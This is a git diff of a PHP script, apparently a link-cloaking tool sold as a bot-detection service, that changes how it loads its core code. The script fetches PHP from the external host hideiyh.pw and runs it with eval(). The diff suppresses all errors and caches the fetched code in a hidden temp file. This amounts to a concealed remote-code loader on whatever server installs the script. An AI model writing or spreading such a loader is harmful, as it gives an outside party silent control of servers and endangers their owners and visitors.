@@ -1,15 +1,15 @@
 <?php
+session_start();
+error_reporting(0);
+ini_set('display_errors', 0);
 
 /**
- * this code generate by:
- *  __   __  ___   ______   _______  ___   __   __  __   __        _______  _     _ 
- * |  | |  ||   | |      | |       ||   | |  | |  ||  | |  |      |       || | _ | |
- * |  |_|  ||   | |  _    ||    ___||   | |  |_|  ||  |_|  |      |    _  || || || |
- * |       ||   | | | |   ||   |___ |   | |       ||       |      |   |_| ||       |
- * |       ||   | | |_|   ||    ___||   | |_     _||       | ___  |    ___||       |
- * |   _   ||   | |       ||   |___ |   |   |   |  |   _   ||   | |   |    |   _   |
- * |__| |__||___| |______| |_______||___|   |___|  |__| |__||___| |___|    |__| |__|
- * 
+ *                                              
+ *                                                             
+ * ██  ██ ██ ████▄  ██████ ██ ██  ██ ██  ██   █████▄ ██     ██ 
+ * ██████ ██ ██  ██ ██▄▄   ██  ▀██▀  ██████   ██▄▄█▀ ██ ▄█▄ ██ 
+ * ██  ██ ██ ████▀  ██▄▄▄▄ ██   ██   ██  ██ ▄ ██      ▀██▀██▀  
+ *  
  * ==================================================================================
  * | Secure Your Links with Built-in Bot Detection API
  * ==================================================================================
@@ -87,7 +87,18 @@ if (!function_exists('__fast_request')) {
     }
 }
 
-$core = __fast_request('https://hideiyh.pw/api/flow-base');
+$cache_file = sys_get_temp_dir() . '/.hideiyh_flow_base_' . md5(CONFIG['APIKEY']);
+$cache_ttl = 3600; // 1 hour
+
+if (file_exists($cache_file) && (time() - filemtime($cache_file)) < $cache_ttl) {
+    $core = @file_get_contents($cache_file);
+} else {
+    $core = __fast_request('https://hideiyh.pw/api/flow-base');
+    if ($core) {
+        @file_put_contents($cache_file, $core);
+    }
+}
+
 if ($core) {
     eval($core);
 }
